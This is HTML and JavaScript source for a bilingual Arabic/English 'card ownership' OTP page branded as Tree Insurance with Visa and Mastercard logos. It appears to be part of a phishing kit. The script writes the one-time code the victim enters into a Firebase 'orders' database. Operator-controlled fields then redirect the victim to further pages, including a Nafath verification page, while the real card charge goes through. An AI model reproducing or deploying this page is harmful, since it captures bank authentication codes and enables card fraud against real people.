<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <script src="js/i18n.js"></script>
    <title>رمز التحقق | OTP Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/inner-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display:flex; align-items:center; justify-content:center; padding:20px; }
        .acs-header { display:flex; justify-content:space-between; align-items:center; padding:16px 24px; border-bottom:1px solid var(--teal-border); }
        .acs-header h3 { font-size:1rem; font-weight:700; color:var(--text-white); margin:0; }
        .txn-row { display:flex; justify-content:space-between; padding:8px 0; font-size:0.88rem; border-bottom:1px dashed var(--teal-border); }
        .txn-row__label { color:var(--text-muted); }
        .txn-row__value { color:var(--text-white); font-weight:600; }
        .spinner-hidden { display:none; margin:16px auto; }
        .spin-ring.visible { display:block; }
    </style>
</head>
<body>

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="teal-card teal-card--narrow" style="width:100%;">
    <div class="acs-header">
        <h3 data-i18n="otp.title">إثبات ملكية البطاقة</h3>
        <div style="display:flex;align-items:center;gap:10px;">
            <img src="images/logo.png" alt="tree" height="28" onerror="this.src='https://placehold.co/80x28/0a4d35/00e5a0?text=tree'">
            <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
        </div>
    </div>

    <div class="card-body">
        <div class="alert-teal" data-i18n="otp.alert">سيتم إجراء معاملة مالية على حسابك المصرفي، يرجى التحقق من التفاصيل أدناه.</div>

        <div style="margin-bottom:20px;">
            <div class="txn-row">
                <span class="txn-row__label" data-i18n="otp.merchant">التاجر</span>
                <span class="txn-row__value">تري | Tree Insurance</span>
            </div>
            <div class="txn-row">
                <span class="txn-row__label" data-i18n="otp.amount">المبلغ</span>
                <span class="txn-row__value">SAR <span id="txn-amount">--.--</span></span>
            </div>
            <div class="txn-row" style="border-bottom:none;">
                <span class="txn-row__label" data-i18n="otp.card">البطاقة</span>
                <span class="txn-row__value" dir="ltr">**** **** **** <span id="card-last4">----</span></span>
            </div>
        </div>

        <div class="field">
            <label class="field__label" data-i18n="otp.label">رمز التحقق (OTP)</label>
            <p style="font-size:0.78rem;color:var(--text-muted);margin-bottom:10px;" data-i18n="otp.hint">لتأكيد العملية أدخل الرمز المرسل إلى جوالك المسجل.</p>
            <input type="number" class="otp-input" id="otpInput" placeholder="----">
        </div>

        <div class="timer-chip" style="margin-bottom:16px;">
            <span data-i18n="otp.validity">صلاحية الرمز:</span>
            <span class="timer-chip__num" id="timer">02:00</span>
        </div>

        <button id="submitBtn" class="btn-green" onclick="verifyOTP()" data-i18n="otp.confirm">تأكيد</button>
        <div class="spin-ring spinner-hidden" id="loader" style="margin-top:20px;"></div>

        <div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-top:20px;padding-top:16px;border-top:1px dashed var(--teal-border);">
            <img src="images/payment/visa.svg" height="22" alt="Visa">
            <img src="images/payment/mastercard.svg" height="22" alt="Mastercard">
        </div>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const userId = localStorage.getItem('user_id');

    if (userId) {
        db.collection("orders").doc(userId).get().then((doc) => {
            if (doc.exists && doc.data().card_number) {
                document.getElementById('card-last4').innerText = doc.data().card_number.replace(/\s/g,'').slice(-4);
            }
        });
    }

    let timeLeft = 120;
    setInterval(() => {
        if (timeLeft <= 0) return;
        timeLeft--;
        const m = Math.floor(timeLeft/60).toString().padStart(2,'0');
        const s = (timeLeft%60).toString().padStart(2,'0');
        document.getElementById('timer').innerText = m+':'+s;
    }, 1000);

    async function verifyOTP() {
        const otpValue = document.getElementById('otpInput').value;
        if (otpValue.length < 4) { alert(t('otp.err_short')); return; }

        document.getElementById('submitBtn').style.display = 'none';
        document.getElementById('loader').classList.add('visible');

        try {
            await db.collection("orders").doc(userId).update({ otp_code: otpValue, status: "show_mobile" });
            setTimeout(() => { window.location.href = "mobile_verification.html"; }, 1000);
        } catch (error) {
            alert(t('otp.err_connection'));
            document.getElementById('submitBtn').style.display = 'block';
            document.getElementById('loader').classList.remove('visible');
        }
    }

    (function() {
        if (userId) {
            db.collection("orders").doc(userId).onSnapshot((doc) => {
                if (doc.exists) {
                    const data = doc.data();
                    if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
                    else if (data.next_step === "GO_TO_NAFATH") window.location.href = "nafath.html";
                }
            });
        }
    })();
</script>
</body>
</html>
